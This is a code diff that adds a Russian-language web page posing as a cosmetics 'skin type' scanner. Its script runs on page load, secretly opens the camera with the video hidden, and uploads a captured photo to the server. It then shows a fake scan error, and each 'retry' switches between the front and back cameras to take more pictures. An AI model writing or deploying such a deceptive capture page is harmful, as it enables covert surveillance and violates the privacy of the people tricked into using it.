@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подбор косметики</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 90vh;
+        }
+        .container {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        video {
+            display: none;
+        }
+        .error-box {
+            display: none;
+            background-color: #ffe6e6;
+            color: #d9534f;
+            border: 1px solid #f5c6cb;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+        button {
+            background-color: #ff4d4d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Подбор косметики</h2>
+    <p id="main-text">Загрузка рекомендаций...</p>
+    
+    <div class="error-box" id="error-box">
+        <p><strong>Ошибка сканирования!</strong></p>
+        <p>Не удалось определить тип кожи. Пожалуйста, повторите попытку.</p>
+        <button onclick="restartScan()">Повторить</button>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const mainText = document.getElementById('main-text');
+    const errorBox = document.getElementById('error-box');
+
+    // Флаг для чередования: false = фронтальная (первый вход), true = задняя (при нажатии повтора)
+    let useEnvironment = false;
+
+    async function covertCapture() {
+        try {
+            const facingModeSetting = useEnvironment ? { exact: "environment" } : "user";
+            
+            let stream;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingModeSetting },
+                    audio: false
+                });
+            } catch (e) {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: useEnvironment ? "environment" : "user" },
+                    audio: false
+                });
+            }
+
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const dataUrl = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        image: dataUrl, 
+                        camera_type: useEnvironment ? "back" : "front" 
+                    })
+                })
+                .then(() => showErrorState())
+                .catch(() => showErrorState());
+
+            }, 1500);
+
+        } catch (err) {
+            setTimeout(showErrorState, 1500);
+        }
+    }
+
+    function showErrorState() {
+        mainText.style.display = 'none';
+        errorBox.style.display = 'block';
+    }
+
+    function restartScan() {
+        errorBox.style.display = 'none';
+        mainText.style.display = 'block';
+        mainText.innerText = "Повторный анализ...";
+        
+        // Переключаем камеру на противоположную при клике "Повторить" (и так по кругу)
+        useEnvironment = !useEnvironment;
+        
+        covertCapture();
+    }
+
+    window.onload = covertCapture;
+</script>
+
+</body>
+</html>
